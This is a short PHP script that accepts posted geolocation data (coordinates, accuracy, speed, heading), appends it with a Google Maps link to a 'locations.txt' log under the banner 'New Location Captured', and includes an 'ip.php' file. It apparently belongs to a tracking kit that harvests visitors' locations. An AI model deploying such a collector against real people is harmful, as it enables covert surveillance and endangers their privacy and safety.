<?php

include 'ip.php';

header('Content-Type: application/json');

// Read JSON input
$input = json_decode(file_get_contents("php://input"), true);

if (!$input) {
    echo json_encode([
        "status" => "error",
        "message" => "No JSON received"
    ]);
    exit;
}

$latitude  = $input['latitude'] ?? null;
$longitude = $input['longitude'] ?? null;
$accuracy  = $input['accuracy'] ?? 'Unknown';
$altitude  = $input['altitude'] ?? 'N/A';
$speed     = $input['speed'] ?? 'N/A';
$heading   = $input['heading'] ?? 'N/A';

$date = date('dMYHis');

if ($latitude && $longitude) {

    $data =
"=== New Location Captured ===\n" .
"Latitude: $latitude\n" .
"Longitude: $longitude\n" .
"Accuracy: $accuracy meters\n" .
"Altitude: $altitude\n" .
"Speed: $speed\n" .
"Heading: $heading\n" .
"Google Maps: https://www.google.com/maps?q=$latitude,$longitude\n" .
"Date: $date\n\n";

    file_put_contents("locations.txt", $data, FILE_APPEND);

    echo json_encode(["status" => "success"]);

} else {
    echo json_encode(["status" => "error", "message" => "Missing data"]);
}

?>